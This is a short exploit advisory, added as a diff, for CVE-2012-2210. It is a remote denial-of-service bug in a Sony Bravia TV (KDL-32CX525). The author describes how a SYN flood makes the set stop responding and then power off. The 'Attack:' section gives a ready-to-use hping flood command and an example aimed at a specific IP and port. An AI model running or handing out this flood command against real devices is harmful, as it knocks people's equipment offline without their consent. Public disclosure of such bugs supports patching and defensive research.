@@ -1,0 +1,21 @@
+# Exploit Title: Sony Bravia Remote Denial of Service
+# Date: 04/04/2012
+# Author: Gabriel Menezes Nunes
+# Version: Sony Bravia TV
+# Tested on: Sony Bravia TV (KDL-32CX525)
+# CVE: CVE-2012-2210
+
+Playing with my TV, I found a bug that can crash the device.
+
+Running a hping command against a Sony Bravia TV (KDL-32CX525),
+all the functions stop working instantly. You cannot change the
+volume, channels or access any function. Instantly. After 35 seconds
+the TV stop working and back. This happens 3 times. At fourth time, the
+TV shuts down. In less than 3 minutes, the TV is off remotely. It is
+necessary to turn on the TV physically.
+
+Attack:
+
+hping -S TV.IP.Address -p anyport -i u1 --flood 
+
+Example: hping -S 10.0.0.3 -p 2828 -i u1 --flood
